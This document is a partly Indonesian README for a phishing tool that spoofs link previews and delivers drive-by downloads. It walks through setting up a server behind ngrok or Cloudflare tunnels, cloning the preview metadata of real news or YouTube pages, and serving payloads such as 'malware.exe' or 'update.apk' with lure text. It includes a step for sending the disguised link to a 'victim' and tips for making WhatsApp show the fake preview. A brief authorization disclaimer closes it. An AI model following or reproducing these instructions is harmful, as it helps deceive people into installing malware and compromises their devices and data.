# Hyperlink Spoofing + Drive-by Download Framework

## Full Build Instructions (Cross-Platform)

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Installation](#installation)
3. [Quick Start](#quick-start)
4. [Configuration](#configuration)
5. [Universal OG Fetcher](#universal-og-fetcher)
6. [Deployment](#deployment)
7. [Usage Examples](#usage-examples)
8. [Troubleshooting](#troubleshooting)
9. [API Reference](#api-reference)
10. [Legal Considerations](#legal-considerations)

---

## Prerequisites

### System Requirements

- **OS**: Linux (Ubuntu 18.04+, Kali, Parrot), macOS (Big Sur+), or Windows 10/11
- **Python**: 3.7+
- **RAM**: 512MB
- **Network**: Internet access (for ngrok/OG fetching)

### Check Requirements

```bash
# Linux/macOS/Windows
python3 --version    # >= 3.7 (Windows might be python --version)
pip3 --version       # Windows: pip --version
```

---

## Installation

### Linux (Ubuntu/Kali/Parrot)

```bash
cd hyperlink-driveby-lab
pip3 install -r requirements.txt
chmod +x run.py
```

### macOS

```bash
cd hyperlink-driveby-lab
pip3 install -r requirements.txt
chmod +x run.py
```

### Windows

```cmd
cd hyperlink-driveby-lab
pip install -r requirements.txt
```

### Setup Ngrok

**Linux:**
```bash
sudo snap install ngrok
ngrok authtoken YOUR_TOKEN
```

**macOS:**
```bash
brew install ngrok
ngrok authtoken YOUR_TOKEN
```

**Windows:**
```cmd
winget install ngrok
ngrok authtoken YOUR_TOKEN
```

---

## Quick Start

### 1. Matikan Server Lama

**PENTING**: Selalu matikan server lama sebelum menjalankan baru:

**Linux/macOS:**
```bash
lsof -i :8088
kill $(lsof -t -i:8088) 2>/dev/null
```

**Windows (run as Administrator):**
```cmd
netstat -ano | findstr :8088
taskkill /PID <PID> /F
```

### 2. Jalankan Interactive Mode

**Linux/macOS:**
```bash
python3 run.py
```

**Windows:**
```cmd
python run.py
```

### 3. Input Values

```
[1] TARGET URL
  Target URL: https://news.detik.com/berita/d-8579874/polisi-olah-tkp-kasus-warga-depok-diteror-tetangga-hingga-pagar-rusak

[2] PAYLOAD FILE
  Payload file: ./payload/document.pdf

[3] DOWNLOAD FILENAME
  Download name: document.pdf

[4] SERVER PORT
  Port [8088]: 8088

[5] PUBLIC URL
  Choose [1/2/3]: 3
  Enter public URL: https://8226-104-28-163-39.ngrok-free.app

[6] CUSTOM PREVIEW (Optional)
  Custom title (blank=auto): 
  Custom description (blank=auto): 
```

**CATATAN PENTING**:
- Custom title/description **KOSONGKAN** jika ingin auto-fetch dari URL target
- Jika diisi, server akan pakai custom value dan TIDAK fetch dari URL

### 4. Kirim Link ke Victim

```
https://8226-104-28-163-39.ngrok-free.app/v?id=https%3A%2F%2Fnews.detik.com%2Fberita%2Fd-8579874%2Fpolisi-olah-tkp-kasus-warga-depok-diteror-tetangga-hingga-pagar-rusak
```

---

## Configuration

### Auto-Generated Config

`run.py` akan generate `config.py` otomatis. Struktur:

```python
# config.py (cross-platform)

import platform

def get_local_ip():
    """Get local IP address (Linux/Windows/macOS)"""
    try:
        os_name = platform.system().lower()
        if os_name == "linux":
            # Linux: ip command
            ...
        elif os_name == "windows":
            # Windows: ipconfig
            ...
        elif os_name == "darwin":  # macOS
            # macOS: ifconfig
            ...
    except Exception:
        pass
    return "127.0.0.1"

# Server
LOCAL_IP = "192.168.100.10"
PORT = 8088
PUBLIC_URL = "https://8226-104-28-163-39.ngrok-free.app"

# Target URL
TARGET_URL = "https://news.detik.com/berita/d-8579874/..."

# Payload
PAYLOAD_FILE = "document.pdf"
PAYLOAD_MIME = "application/pdf"
DOWNLOAD_NAME = "document.pdf"

# Custom OG (kosong = auto-fetch)
CUSTOM_TITLE = ""
CUSTOM_DESCRIPTION = ""
```

### Behavior Custom OG

| CUSTOM_TITLE | CUSTOM_DESCRIPTION | Behavior |
|--------------|-------------------|----------|
| Kosong | Kosong | Auto-fetch dari URL target |
| Diisi | Kosong | Pakai custom title, auto-fetch desc |
| Kosong | Diisi | Auto-fetch title, pakai custom desc |
| Diisi | Diisi | Pakai custom title + desc (NO fetch) |

---

## Universal OG Fetcher

### Cara Kerja

```
URL Target
    ↓
1. Cek oEmbed endpoint (YouTube, Vimeo, etc)
    ↓ (jika ada)
   Fetch via oEmbed API → Return data
    ↓ (jika tidak ada)
2. Fetch HTML → Parse OG tags
    ↓ (jika tidak ada OG)
3. Fallback ke <title> + <meta> tags
```

### Supported Platforms

#### Via oEmbed API
- YouTube
- Vimeo
- Dailymotion
- SoundCloud
- Twitter/X
- Spotify

#### Via HTML Parsing
- Detik
- Kompas
- CNN Indonesia
- GitHub
- Reddit
- Semua situs dengan OG tags

### Test OG Fetch

```bash
# Linux/macOS
curl "http://localhost:8088/api/fetch-og?url=https://www.youtube.com/watch?v=3IIAes4Pr9w"

# Windows (PowerShell)
curl "http://localhost:8088/api/fetch-og?url=https://www.youtube.com/watch?v=3IIAes4Pr9w"
```

---

## Deployment

### Option 1: Local Network Only

```bash
# Linux/macOS
python3 run.py

# Windows
python run.py
```

### Option 2: With Ngrok

**Terminal 1:**
```bash
# Linux/macOS
python3 run.py

# Windows
python run.py
```

**Terminal 2:**
```bash
ngrok http 8088
```

### Option 3: With Cloudflare Tunnel

```bash
# Install cloudflared
# Linux:
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
chmod +x cloudflared
sudo mv cloudflared /usr/local/bin/

# macOS:
brew install cloudflared

# Windows: Download from https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/

# Run tunnel
cloudflared tunnel --url http://localhost:8088
```

---

## Usage Examples

### Contoh 1: Detik Article

**Linux/macOS:**
```bash
python3 run.py
```

**Windows:**
```cmd
python run.py
```

Input:
```
Target URL:     https://news.detik.com/berita/d-8579874/polisi-olah-tkp-kasus-warga-depok-diteror-tetangga-hingga-pagar-rusak
Payload file:   ./payload/document.pdf
Download name:  document.pdf
Port:           8088
Public URL:     https://8226-104-28-163-39.ngrok-free.app
Custom title:   (Enter/blank)
Custom desc:    (Enter/blank)
```

### Contoh 2: CLI Mode

**Linux/macOS:**
```bash
python3 run.py \
  --url "https://www.youtube.com/watch?v=3IIAes4Pr9w" \
  --payload ./payload/test.apk \
  --name "update.apk" \
  --port 8088 \
  --public-url "https://8226-104-28-163-39.ngrok-free.app"
```

**Windows:**
```cmd
python run.py ^
  --url "https://www.youtube.com/watch?v=3IIAes4Pr9w" ^
  --payload .\payload\test.apk ^
  --name "update.apk" ^
  --port 8088 ^
  --public-url "https://8226-104-28-163-39.ngrok-free.app"
```

### Contoh 3: Custom OG Tags

**Linux/macOS:**
```bash
python3 run.py \
  --url "https://example.com/article" \
  --payload ./payload/malware.exe \
  --title "Important Document" \
  --description "Please review this document immediately"
```

**Windows:**
```cmd
python run.py ^
  --url "https://example.com/article" ^
  --payload .\payload\malware.exe ^
  --title "Important Document" ^
  --description "Please review this document immediately"
```

---

## Troubleshooting

### Problem: Server Tidak Mau Start

**Linux/macOS:**
```bash
lsof -i :8088
kill $(lsof -t -i:8088) 2>/dev/null
python3 run.py
```

**Windows:**
```cmd
netstat -ano | findstr :8088
taskkill /PID <PID> /F
python run.py
```

### Problem: OG Tags Tidak Muncul

1. **Cek URL target valid**:
   ```bash
   curl -I "https://target-url.com/article"
   # Harus return 200 OK
   ```

2. **Test crawler response**:
   ```bash
   curl -A "WhatsApp/2.22.20.72" "http://localhost:8088/v?id=URL_TARGET"
   ```

3. **Cek server logs**:
   ```bash
   cat /tmp/server.log  # Linux/macOS
   type server.log      # Windows
   ```

### Problem: Preview Tidak Muncul di WhatsApp

1. **Pastikan HTTPS**: WA membutuhkan HTTPS untuk OG tags
2. **Pastikan URL target valid**: Bukan 404
3. **Test dengan Facebook Debugger**: https://developers.facebook.com/tools/debug/

### Problem: Download Tidak Jalan

1. **Cek payload ada**:
   ```bash
   ls -la payload/     # Linux/macOS
   dir payload\        # Windows
   ```

2. **Cek MIME type**:
   ```
   APK: application/vnd.android.package-archive
   PDF: application/pdf
   EXE: application/x-msdownload
   ```

---

## API Reference

### Health Check
```bash
curl http://localhost:8088/health
```

### Fetch OG Tags
```bash
curl "http://localhost:8088/api/fetch-og?url=TARGET_URL"
```

### Get Logs
```bash
curl http://localhost:8088/api/logs
```

### Admin Dashboard
```
http://localhost:8088/admin
```

---

## Legal Considerations

### Authorization Required

**WAJIB**: Anda harus memiliki izin tertulis sebelum menggunakan tool ini.

### Acceptable Use

- Authorized penetration testing
- Security awareness training
- Educational purposes
- Testing on your own systems

### Not Acceptable

- Unauthorized access to computer systems
- Malicious use without consent
- Violating computer fraud laws

---

## Version History

- **v2.2**: Full cross-platform support (Linux, macOS, Windows), fixed link display
- **v2.1**: Universal OG fetcher (oEmbed + HTML parsing), Detik/Kompas support
- **v2.0**: Dynamic input, CLI mode
- **v1.0**: Initial release

---

*Last updated: July 2026*
